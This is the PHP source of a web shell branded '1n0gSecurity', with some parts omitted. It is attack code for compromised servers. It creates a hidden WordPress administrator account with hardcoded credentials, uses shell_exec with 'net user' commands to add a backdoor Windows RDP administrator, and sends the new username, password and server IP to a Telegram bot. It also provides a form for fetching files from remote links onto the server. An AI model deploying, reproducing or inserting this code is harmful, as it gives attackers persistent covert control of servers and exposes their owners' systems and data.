...
<center>
<font face="Bungee" size="5">1n0gSecurity Webshell</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://i.ibb.co/mCpd4kS/background-1.png" width="280" height="280" title="1n0gSecurity" alt="1n0gSecurity" class="center" />
<br><br><br>
<?php
...
if (file_exists($_SERVER['DOCUMENT_ROOT'] . '/wp-config.php')) {
    ...
    if ($_SERVER['REQUEST_METHOD'] == 'GET') {
        // Define user data
        $userData = array(
            'user_pass' => "1n0gSecurity",
            'user_login' => "1n0gSecurity",
            'user_nicename' => "1n0gSecurity",
            'user_email' => "BIBIL0DAY@proton.me",
            'display_name' => "1n0gSecurity",
            'role' => 'administrator'
        );
...
function author() {
	echo "<center><br>T.ME/BIBIL_0DAY</center>";
	exit();
}
...
if (strpos(php_uname(), 'Windows NT') !== false) {
    // Create administrator RDP account
    $userRDP = "1n0gSecurity";
    $passRDP = "HCXi6~0`20323";
    $createUserCommand = "net user " . $userRDP . " " . $passRDP . " /add";
    $addUserToAdminsCommand = "net localgroup administrators " . $userRDP . " /add";
    
    $createUserResult = shell_exec($createUserCommand);

    if ($createUserResult !== null) {
        $addUserResult = shell_exec($addUserToAdminsCommand);
        ...
        if ($addUserResult !== null) {
            ...
            $telegramBotAPI = "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage";

            // Message to be sent to Telegram
            $message = "Administrator account created successfully.\n";
            $message .= "Username: " . $userRDP . "\n";
            $message .= "Password: " . $passRDP . "\n";
            $message .= "Server IP: " . $serverIP;

            // Send message to Telegram bot
            file_get_contents($telegramBotAPI . "?chat_id=<YOUR_CHAT_ID>&text=" . urlencode($message));
        }
    }
}
...
<input type="text" name="darilink" class="up" placeholder="https://t.me/1n0gSecurity">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</center>
</form>';
echo "</table><br>";
